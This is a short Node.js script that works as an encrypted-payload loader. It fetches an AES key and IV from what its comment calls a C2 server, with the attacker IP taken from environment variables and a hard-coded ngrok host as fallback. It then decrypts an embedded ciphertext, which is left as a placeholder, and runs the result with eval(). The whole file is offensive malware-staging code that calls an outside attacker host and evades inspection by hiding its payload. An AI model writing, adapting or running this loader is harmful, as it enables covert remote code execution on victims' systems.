const axios = require('axios');
const crypto = require('crypto');

async function decryptAndRun() {
    try {
        // Fetch key and IV from C2 server
        const response = await axios.get(`http://${process.env.ATTACKER_IP || '3bd6-2601-152-4d00-3f00-bd47-151e-f9bc-eb40.ngrok-free.app'}:${process.env.ATTACKER_PORT || 8080}/key`);
        const { key, iv } = response.data;
        const keyBuffer = Buffer.from(key, 'base64');
        const ivBuffer = Buffer.from(iv, 'base64');

        // Embedded encrypted script
        const encryptedScript = Buffer.from('ENCRYPTED_SCRIPT', 'base64'); // Replace with actual ciphertext

        // Decrypt
        const decipher = crypto.createDecipheriv('aes-256-cbc', keyBuffer, ivBuffer);
        let decrypted = decipher.update(encryptedScript);
        decrypted = Buffer.concat([decrypted, decipher.final()]);
        
        // Execute decrypted script
        eval(decrypted.toString());
    } catch (error) {
        console.error(`Failed to decrypt or run script: ${error.message}`);
        process.exit(1);
    }
}

decryptAndRun();
